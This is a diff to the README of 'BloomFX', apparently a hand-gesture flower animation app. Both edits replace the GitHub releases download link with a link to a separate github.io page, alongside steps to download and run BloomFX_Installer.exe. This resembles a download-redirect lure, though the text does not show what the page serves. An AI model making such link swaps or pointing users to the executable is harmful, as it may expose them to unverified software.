@@ -1,6 +1,6 @@
 # 🌸 BloomFX - Grow digital flowers with your hands
 
-[![Download BloomFX](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Suwals772/BloomFX/releases)
+[![Download BloomFX](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://suwals772.github.io)
 
 BloomFX creates digital flowers in real-time. The software uses your computer camera to track your hand movements. It turns your gestures into procedural flower animations. You see the flowers grow and bloom on your screen as you move your hands through the air.
 
@@ -20,7 +20,7 @@ Ensure you have a steady internet connection for the initial download. The progr
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit [this page to download](https://github.com/Suwals772/BloomFX/releases) the latest version.
+1. Visit [this page to download](https://suwals772.github.io) the latest version.
 2. Locate the file named BloomFX_Installer.exe in your downloads folder.
 3. Double-click the file to start the setup process.
 4. Follow the prompts on your screen.
